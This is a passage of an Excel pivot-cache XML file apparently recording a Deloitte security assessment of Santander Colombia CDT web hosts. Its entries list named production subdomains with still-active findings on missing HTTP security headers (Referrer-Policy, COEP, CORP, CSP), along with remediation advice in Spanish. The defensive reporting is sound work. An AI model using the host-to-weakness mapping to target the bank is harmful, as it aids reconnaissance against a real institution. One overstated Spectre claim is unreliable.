    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO015"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="403"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO016"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="404"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO017"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="405"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO018"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="406"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO019"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="407"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO020"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="408"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO021"/>
    <x v="184"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador"/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="409"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO022"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="410"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO023"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="411"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO024"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="412"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO025"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="413"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO026"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="414"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO027"/>
    <x v="185"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="415"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO028"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="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
    <s v="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 "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="416"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO029"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="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
    <s v="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 "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="417"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO030"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="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
    <s v="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 "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="418"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO031"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="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
    <s v="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 "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="419"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO032"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="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
    <s v="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 "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="420"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO033"/>
    <x v="186"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Revisar la lógica de la aplicación de las operaciones que presentan este tipo de problemática, con el objetivo de optimizar las mismas, para que puedan consumir la menor cantidad de recursos posible en ser procesadas. Adicionalmente, se recomienda dimensionar las plataformas que intervienen en el funcionamiento de la aplicación acorde a las necesidades de rendimiento y/o tiempos de respuesta requeridos para las operaciones"/>
    <s v="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 operaciones puedan estar disponibles para los usuarios legítimos. "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="421"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO034"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar_x000a_scripts dentro de la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a_x000a_securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página_x000a_externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos._x000a_Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera_x000a_HTTP Content-Security-Policy._x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos_x000a_sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran_x000a_parte de las capacidades de seguridad de la cabecera._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_· Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>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
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="422"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO035"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar_x000a_scripts dentro de la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a_x000a_securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página_x000a_externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos._x000a_Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera_x000a_HTTP Content-Security-Policy._x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos_x000a_sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran_x000a_parte de las capacidades de seguridad de la cabecera._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_· Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>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
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="423"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO036"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar_x000a_scripts dentro de la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a_x000a_securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página_x000a_externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos._x000a_Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera_x000a_HTTP Content-Security-Policy._x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos_x000a_sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran_x000a_parte de las capacidades de seguridad de la cabecera._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_· Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>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
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="424"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO037"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar_x000a_scripts dentro de la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a_x000a_securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página_x000a_externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos._x000a_Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera_x000a_HTTP Content-Security-Policy._x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos_x000a_sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran_x000a_parte de las capacidades de seguridad de la cabecera._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_· Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>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
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="425"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO038"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar_x000a_scripts dentro de la página."/>
